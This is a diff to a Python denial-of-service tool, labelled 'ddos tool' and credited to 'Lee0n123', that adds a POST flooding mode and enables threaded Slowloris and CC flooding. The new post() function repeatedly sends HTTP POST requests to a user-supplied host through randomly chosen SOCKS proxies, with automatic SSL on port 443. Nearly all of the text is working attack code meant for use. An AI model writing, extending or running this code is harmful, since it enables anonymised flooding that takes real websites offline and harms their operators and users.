@@ -17,7 +17,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 1.6.3(ReCode CC and Slow mode)
+Python3 version 1.7 (Add Post Attack Mode)
                             C0d3d by Lee0n123
 ===============================================
        --> Use 443 Port Auto Enable SSL <--
@@ -219,8 +219,55 @@ def cc():
 				print ("[!] Connection Error")
 				s.close()
 
+def post():
+	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: "+ ip + "\r\n"
+	content = "Content-Type: application/x-www-form-urlencoded\r\n"
+	length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+	refer = "Referer: http://"+ ip + url2 + "\r\n"
+	user_agent = "User-Agent: " + random.choice(useragents) + "\r\n"
+	accept = random.choice(acceptall)
+	#data = str(random._urandom(16)) // You can enable bring data in HTTP Header
+	request = post_host + accept + refer + content + user_agent + length + "\r\n"# + data 
+	proxy = random.choice(proxies).strip().split(":")
+	while True:
+		try:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			s = socks.socksocket()
+			s.connect((str(ip), int(port)))
+			if str(port) == '443': # //AUTO Enable SSL MODE :)
+				s = ssl.wrap_socket(s)
+			else:
+				pass
+			s.send(str.encode(request))
+			print ("[*] 'Post' Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+			try:
+				for y in range(multiple):
+					s.send(str.encode(request))
+			except:
+				s.close()
+		except:
+			s.close()
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				s = socks.socksocket()
+				s.connect((str(ip), int(port)))
+				if str(port) == '443':
+					s = ssl.wrap_socket(s)
+				else:
+					pass
+				s.send(str.encode(request))
+				print("[*] 'Post' Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+				try:
+					for y in range(multiple):
+						s.send(str.encode(request))
+				except:
+					s.close()
+			except:
+				print ("[!] Connection Error")
+				s.close()
+
 def slow():
-	time.sleep(1)
+	time.sleep(1)# SLow Mode
 	proxy = random.choice(proxies).strip().split(":")
 	try:
 		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
@@ -230,7 +277,7 @@ def slow():
 			s = ssl.wrap_socket(s)
 		else:
 			pass
-		s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+		s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
 		s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
 		s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 		s.send(("Connection:keep-alive").encode("utf-8"))
@@ -250,7 +297,7 @@ def main():
 	global port
 	global proxies
 	global multiple
-	mode = str(input("> Choose Your Mode (cc/slow) :"))
+	mode = str(input("> Choose Your Mode (cc/post/slow) :"))
 	ip = str(input("> Host/Ip:"))
 	if mode == "slow":
 		pass
@@ -282,12 +329,12 @@ def main():
 	proxies = open(out_file).readlines()
 	time.sleep(0.03)
 	if mode == "slow":
-		pass
+		for i in range(thread_num):
+			th = threading.Thread(target = slow)
+			th.start()
+			time.sleep(0.08)
 	else:
 		multiple = int(input("> Input the Magnification:"))
-	if mode == "slow":
-		pass
-	else:
 		if url == '':
 			url2 = "/"
 		else:
@@ -297,6 +344,10 @@ def main():
 			th = threading.Thread(target = slow)
 			th.start()
 			time.sleep(0.08)
+	elif mode == "post":
+		for i in range(thread_num):
+			th = threading.Thread(target = post)
+			th.start()
 	elif mode == "cc":
 		for i in range(thread_num):
 			th = threading.Thread(target = cc)
